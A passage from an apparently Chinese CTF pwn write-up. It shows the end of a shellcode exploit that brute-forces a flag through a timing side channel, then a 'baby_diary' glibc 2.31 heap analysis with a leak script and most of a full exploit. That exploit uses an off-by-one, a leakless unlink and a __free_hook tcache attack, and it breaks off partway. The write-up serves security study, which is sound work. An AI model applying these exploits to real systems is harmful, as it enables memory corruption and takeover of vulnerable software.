rax</span></span><br><span class="line"><span class="string">    pop r8</span></span><br><span class="line"><span class="string">    push rax /*set r9*/</span></span><br><span class="line"><span class="string">    pop r9</span></span><br><span class="line"><span class="string">    /*syscall*/</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x31],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x32],cl</span></span><br><span class="line"><span class="string">    push 0x22 /*set rcx*/</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    push 0x40/*set rax*/</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x49</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0x40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x57],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x58],cl</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x70</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x72</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push 0x48</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push 0x23</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">p,index,ch</span>):</span></span><br><span class="line">    shellcode_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /*fp = open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">        mov esp,0x40404140</span></span><br><span class="line"><span class="string">        push 0x67616c66</span></span><br><span class="line"><span class="string">        push esp</span></span><br><span class="line"><span class="string">        pop ebx</span></span><br><span class="line"><span class="string">        xor ecx,ecx</span></span><br><span class="line"><span class="string">        mov eax,5</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">        mov ecx,eax</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    shellcode_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        push 0x33</span></span><br><span class="line"><span class="string">        push 0x40404089</span></span><br><span class="line"><span class="string">        retfq</span></span><br><span class="line"><span class="string">        /*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">        mov rdi,rcx</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x70</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    shellcode += shellcode_mmap</span><br><span class="line">    shellcode += append</span><br><span class="line">    shellcode += shellcode_read</span><br><span class="line">    shellcode += append</span><br><span class="line">    shellcode += shellcode_retfq</span><br><span class="line">    shellcode += append</span><br><span class="line">    shellcode = asm(shellcode,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sl(shellcode)</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">        shellcode_flag+=<span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;],&#123;1&#125;;jz $-3;ret&quot;</span>.<span class="built_in">format</span>(index,ch)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode_flag+=<span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;],&#123;1&#125;;jz $-4;ret&quot;</span>.<span class="built_in">format</span>(index,ch)</span><br><span class="line"></span><br><span class="line">    shellcode_x86 = asm(shellcode_x86,arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    shellcode_flag = asm(shellcode_flag,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    shellcode = shellcode_x86 + <span class="number">0x29</span>*<span class="string">b&#x27;\x90&#x27;</span> + shellcode_flag</span><br><span class="line"></span><br><span class="line">    sl(shellcode)</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">127</span>):</span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(challenge)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    pwn(p,index,ch)</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    end=time.time()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">if</span> end-start&gt;<span class="number">1.5</span>:</span><br><span class="line">      a.append(ch)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  index = index + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="baby-diary"><a href="#baby-diary" class="headerlink" title="baby_diary"></a>baby_diary</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">baby_diary: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">664b</span>d170fa1869d1e8bae262af76385c91c3e97d, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>整数溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_list[i] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>负数溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index = input();</span><br><span class="line"><span class="keyword">if</span> ( check(index) )</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)chunk_list[index]);</span><br></pre></td></tr></table></figure>
<p>有 off-by-one 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk = chunk_list[index];</span><br><span class="line">size_list[index] = len;</span><br><span class="line"><span class="keyword">if</span> ( len )</span><br><span class="line">  chunk[len + <span class="number">1</span>] = (chunk[len + <span class="number">1</span>] &amp; <span class="number">0xF0</span>) + code2(index);</span><br></pre></td></tr></table></figure>
<ul>
<li>可以控制 <code>chunk[len + 1]</code> 为 <code>0x0-0xf</code></li>
</ul>
<p><strong>入侵思路</strong></p>
<p>本题目的核心点就是无泄露 unlink，对于所有的无泄漏 unlink 都可以考虑如下的堆风水：</p>
<ul>
<li>获取两个 unsorted chunk 进行合并，其中的第二个 chunk 末地址必须为 <code>\x00</code>（遗留下 FD BK 指针）</li>
<li>重新申请大 unsorted chunk 后释放（不破坏原来的 heap 结构），然后再次进行分割，使第二个 chunk 的末尾地址为 <code>\x30</code> 或者 <code>\x40</code> <code>\x50</code> 等等（有一定偏移的地址都可以）</li>
<li>之后利用 unsortedbin 进行调整，在 FD-&gt;bk 和 BK-&gt;fd 中写入 <code>\x30</code>，然后覆盖为 <code>\x00</code></li>
</ul>
<p>不过本题目有点特殊，在具体的堆风水在构建时需要作出微调，可以参考如下的泄露脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x378</span>,<span class="string">&quot;8&quot;</span>*<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x427</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>) <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x426</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x01&quot;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">&quot;\x0d&quot;</span>+<span class="string">&quot;\n&quot;</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">dele(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&quot;\n&quot;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x208</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x1ff</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot; content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ec210</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>最后调整一下堆风水，劫持 tcache attack 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./baby_diary1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x17D7)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data=<span class="string">&quot;\n&quot;</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot; size:&quot;</span>,<span class="built_in">str</span>(size-<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot; content: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x378</span>,<span class="string">&quot;8&quot;</span>*<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x427</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>) <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x426</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x01&quot;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">&quot;\x0d&quot;</span>+<span class="string">&quot;\n&quot;</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">dele(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&quot;\n&quot;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x208</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x1ff</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot; content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ec210</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x100</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x100</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x100</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span 